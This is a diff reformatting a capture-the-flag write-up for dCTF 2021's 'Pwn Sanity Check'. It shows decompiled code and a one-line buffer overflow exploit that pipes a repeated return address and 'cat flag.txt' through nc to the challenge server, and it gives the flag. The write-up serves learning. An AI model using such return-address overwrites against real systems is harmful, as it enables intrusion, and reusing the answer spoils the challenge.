@@ -1,12 +1,16 @@
-Challenge: Pwn Sanity Check
-<br>
-Points: 100
-<br>
-Category: Pwn
-<br>
-Objective: Find the flag on the server with the help of a given file
-<br>
-Process to find the flag: So first of all I opened the given file on Ghidra and saw this.
+# Pwn Sanity Check
+
+
+> Tags: pwn, bof  
+> Points: 100  
+
+## Challenge Description
+> This should take about 1337 seconds to solve.
+nc dctf-chall-pwn-sanity-check.westeurope.azurecontainer.io 7480
+
+
+## Analysis
+So first of all I opened the given file on Ghidra and saw this.
 ```
 void vuln(void)
 {
@@ -47,14 +51,16 @@ void win(int param_1,int param_2)
   ```
 
 To solve this we needed a python script, which would skip all the basic parameters and get us the flag.
+
 So this is the python script that we wrote
 ```python
 (perl -e 'print "\xdb\x06\x40\x00\x00\x00\x00\x00"x"32"."\n"';echo "cat flag.txt")|nc dctf-chall-pwn-sanity-check.westeurope.azurecontainer.io 7480
 ```
 So basically the address the computer will go to after the function is right after the area we are reading data into. 
+
 So we just overwrite the address and the data that is being repeated 32 times is the address.
 The result of this command is 
-<br><br>
+
 ![result](https://github.com/thirty2/CTF-Writeups/blob/master/2021/dCTF/pwn/Pwn-sanity-check/result_pwn.png)
-<br>
+
 The flag: dctf{Ju5t_m0v3_0n}
